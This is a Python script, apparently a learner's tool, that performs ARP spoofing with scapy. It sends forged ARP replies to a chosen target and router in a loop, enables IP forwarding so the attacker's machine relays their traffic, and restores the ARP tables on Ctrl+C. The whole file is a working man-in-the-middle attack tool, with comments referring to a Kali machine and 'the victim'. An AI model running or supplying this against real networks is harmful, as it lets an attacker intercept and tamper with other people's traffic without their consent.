import argparse
import subprocess
import time

import scapy.all as scapy


def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip_address", help="For entering ip address of target")
    parser.add_argument("-r", "--router", dest="router_ip_address", help="For entering ip address of router")
    parser.add_argument("-tm", "--target_mac", dest="target_mac_address", help="For entering mac address of  target")
    parser.add_argument("-rm", "--router_mac", dest="router_mac_address", help="For entering mac address of router")
    options = parser.parse_args()#options is a variable name and can be assigned as wished.
    return options.target_ip_address, options.router_ip_address, options.target_mac_address, options.router_mac_address


def arp_response(target_ip_address, router_ip_address, target_mac_address, router_mac_address):
    response_for_target = scapy.ARP(op=2, hwdst=target_mac_address, pdst=target_ip_address, psrc=router_ip_address)
    # op=1 stands for enabling it to send requests but if op=2  it enables us to send responses.
    scapy.send(response_for_target, verbose=False)
    response_for_router = scapy.ARP(op=2, hwdst=router_mac_address, pdst=router_ip_address, psrc=target_ip_address)
    scapy.send(response_for_router, verbose=False)
    # scapy.send is to send packet.


def arp_table_reset(target_ip_address, router_ip_address, target_mac_address, router_mac_address):
    response_for_target = scapy.ARP(op=2, hwdst=target_mac_address, pdst=target_ip_address, psrc=router_ip_address,
                                    hwsrc=router_mac_address)
    scapy.send(response_for_target, count=3,
               verbose=False)  # count =3 to ensure that arp tables get changed by sending the following response 3 times.
    response_for_router = scapy.ARP(op=2, hwdst=router_mac_address, pdst=router_ip_address, psrc=target_ip_address,
                                    hwsrc=target_mac_address)
    scapy.send(response_for_router, count=3,
               verbose=False)  # verbose =False so that it doesn't show output of sending 1 packets
    # Main reason to do that is to customize the output according to our need.


subprocess.call("sudo sysctl -w net.ipv4.ip_forward=1  ",
                shell=True)  # to make kali machine act as a router by enabling port forwarding
target_ip_address, router_ip_address, target_mac_address, router_mac_address = parser()
packet_sent = 0
try:  # try and except is used for exception handiing in python.TRY is used until there are no kind of error or interrupt
    while True:
        packet_sent = packet_sent + 2
        print("\rPackets sent:-", packet_sent, end="  ")
        # slash r is for replacing the print output with the next output with cursor at the end and it doesn"t work until
        # ,end="" is added  to end output print cursor at the end of the statement since there is nothing inside "".
        arp_response(target_ip_address, router_ip_address, target_mac_address, router_mac_address)
        time.sleep(2)  # Is a function from class time imported above.
        # Sleep is used to make the loop sleep or to stop for 2 sec and then to continue did this so as not to flood the victim

        # except  needs to be individually initialized so as to mention the type of error and
except KeyboardInterrupt:  # to customize the output of error instead of showing default.
    print("\nDetected Ctrl+C Quitting please wait a while till arp tables of target is reset to default")
    subprocess.call("sudo sysctl -w net.ipv4.ip_forward=0  ",
                    shell=True)  # to disable kali machine act as a router by disabling port forwarding
    arp_table_reset(target_ip_address, router_ip_address, target_mac_address, router_mac_address)


